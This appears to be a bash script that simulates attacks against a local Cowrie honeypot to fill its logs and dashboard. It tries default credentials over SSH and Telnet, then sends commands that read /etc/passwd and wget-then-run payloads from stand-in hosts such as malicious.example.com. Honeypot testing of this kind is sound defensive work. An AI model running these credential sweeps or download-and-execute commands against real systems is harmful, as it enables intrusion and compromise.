#!/bin/bash

echo "🧪 Generating Test Data for Cowrie..."

# Install required tools
echo "📦 Installing testing tools..."
sudo apt update
sudo apt install -y sshpass expect

# Function to test SSH with different credentials
test_ssh_connection() {
    local username=$1
    local password=$2
    echo "🔐 Testing SSH: $username:$password"
    
    timeout 15 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 "$username@localhost" << EOF 2>/dev/null
ls -la
cat /etc/passwd
ps aux
uname -a
whoami
id
wget http://malicious.example.com/malware.sh
chmod +x malware.sh
./malware.sh
exit
EOF
    sleep 2
}

# Function to test Telnet
test_telnet_connection() {
    local username=$1
    local password=$2
    echo "📞 Testing Telnet: $username:$password"
    
    expect << EOF 2>/dev/null
spawn telnet localhost 2223
expect "login:"
send "$username\r"
expect "Password:"
send "$password\r"
expect "$ "
send "ls -la\r"
expect "$ "
send "cat /etc/passwd\r"
expect "$ "
send "ps aux\r"
expect "$ "
send "uname -a\r"
expect "$ "
send "wget http://evil.example.com/rootkit\r"
expect "$ "
send "exit\r"
expect eof
EOF
    sleep 2
}

echo "🚀 Starting attack simulation..."

# Common credentials to test
credentials=(
    "root:admin"
    "admin:password"
    "user:123456"
    "guest:guest"
    "test:test"
    "ubuntu:ubuntu"
    "pi:raspberry"
    "oracle:oracle"
)

# Test SSH connections
echo "🔐 Testing SSH connections..."
for cred in "${credentials[@]}"; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    test_ssh_connection "$username" "$password"
done

# Test Telnet connections
echo "📞 Testing Telnet connections..."
for cred in "${credentials[@]:0:3}"; do  # Test first 3 for telnet
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    test_telnet_connection "$username" "$password"
done

# Check log file
echo ""
echo "📝 Checking log file..."
LOG_FILE="/home/cowrie/cowrie/var/log/cowrie/cowrie.json"
if [ -f "$LOG_FILE" ]; then
    echo "✅ Log file exists"
    echo "📊 Size: $(du -h "$LOG_FILE" | cut -f1)"
    echo "📄 Line count: $(wc -l < "$LOG_FILE")"
    echo ""
    echo "Last 5 log entries:"
    tail -5 "$LOG_FILE" | jq . 2>/dev/null || tail -5 "$LOG_FILE"
else
    echo "❌ Log file not found"
fi

echo ""
echo "✅ Test data generation complete!"
echo "📊 Check the dashboard at: http://localhost:3000"
